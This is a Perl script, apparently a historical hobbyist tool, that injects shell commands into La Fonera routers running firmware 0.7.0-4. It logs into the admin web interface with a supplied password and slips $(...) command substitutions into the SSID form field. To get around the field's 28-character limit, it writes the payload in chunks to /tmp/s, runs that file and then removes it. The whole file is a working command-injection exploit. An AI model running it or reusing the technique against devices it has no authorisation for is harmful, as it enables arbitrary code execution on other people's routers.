#!/usr/bin/perl
#
# grammofon.pl
#
# Shell code injector for La Fonera
# developed for firmware version 0.7.0-4
# (local variant)
#
# by Michael Kebe <michael.kebe@web.de>
# and Stefan Tomanek <stefan@pico.ruhr.de>
#
# http://stefans.datenbruch.de/lafonera/

# turn on perl's safety features
use strict;
use warnings;

use WWW::Mechanize;
use MIME::Base64;

sub inject($$$) {
    my ($ip, $password, $code) = @_;
    # create a new browser
    my $browser = WWW::Mechanize->new(autocheck => 1);

    # admin password
    #$browser->credentials($ip,"admin",$password);
    $browser->credentials("admin" => $password);

    my $auth = MIME::Base64::encode("admin:$password");
    $browser->add_header (Authorization=>"Basic $auth");

    # tell it to get the public.sh page
    $browser->get("http://$ip/cgi-bin/webif/private.sh");
    $browser->success() or die "UNABLE TO LOGIN.";

    $browser->form_number('1');
    $browser->field("ssid", $code);
    print "Sending code: ".$code."\n";
    $browser->click();
    $browser->success() or die "CODE INJECTION FAILED."
}

sub readCode() {
    print STDERR "By your command...\n";
    my $code = "";
    while (<STDIN>) {
        $code .= $_;
    }
    return $code;
}

sub cleanUp($$) {
    my ($ip, $password) = @_;
    # we are going to remove the temporary file that might be left
    inject($ip, $password, '$(rm /tmp/s)');
}

sub divideAndConquer($$$) {
    my ($ip, $password, $code) = @_;
    # Make sure our temporary file is empty
    cleanUp($ip, $password);
    # The webinterface limits the ESSID field to 28 characters.
    # Therefore, we divide the command into mutliple segments
    # and assemble them in a temporary file
    my $remaining = $code;

    my $pre = '$(echo -n \'';
    my $post = '\'>>/tmp/s)';
    my $l = 28-length($pre)-length($post);
    while (length($remaining)) {
        no warnings;
        my $part = substr($remaining, 0, $l);
        $remaining = substr($remaining, $l);
        
        my $command = $pre.$part.$post;
        
        inject($ip, $password, $command);
    }
    # Now we execute the file
    inject($ip, $password, '$(. /tmp/s)');
    # and clean up afterwards
    cleanUp($ip, $password);
}

sub isValidCommand($) {
    my ($code) = @_;
    return not ($code =~ /\n|;|'/);
}

sub processArgs() {
    # Retrieve user information from command line
    my $ip = shift(@ARGV) || die "Usage: grammofon.pl IP PASSWORD";
    my $password = shift(@ARGV) || die "Usage: grammofon.pl IP PASSWORD";
    # Read shell code from standard input
    my $code = readCode();
    die "Invalid characters found in command" unless isValidCommand($code);
    divideAndConquer($ip, $password, $code);
    print STDERR "Code has been injected.\n"
}

processArgs();
